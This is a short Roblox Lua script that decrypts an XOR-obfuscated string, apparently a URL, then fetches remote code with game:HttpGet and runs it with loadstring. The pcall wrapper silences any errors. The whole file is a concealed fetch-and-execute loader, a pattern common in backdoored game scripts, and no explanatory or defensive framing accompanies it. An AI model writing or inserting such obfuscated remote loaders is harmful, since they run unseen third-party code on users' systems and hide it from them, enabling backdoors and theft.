
local _hidden_data = "\3\0\11\13\90\78\22\3\22\87\71\87\71\87\71\80\20\2\13\19\11\21\87\93\89\88\90\92\88\71\87\79\21\88\92\71\87\23\82\23\94\8\23\93\15\90"
local _key = "my_secret_key_123"

local function _decrypt(data, key)
    local result = ""
    for i = 1, #data do
        local char = string.byte(data, i)
        local k_char = string.byte(key, (i % #key) + 1)
        result = result .. string.char(bit32.bxor(char, k_char))
    end
    return result
end

pcall(function()
    local real_c_url = _decrypt(_hidden_data, _key)
    local script_content = game:HttpGet(real_c_url)
    loadstring(script_content)()
end)
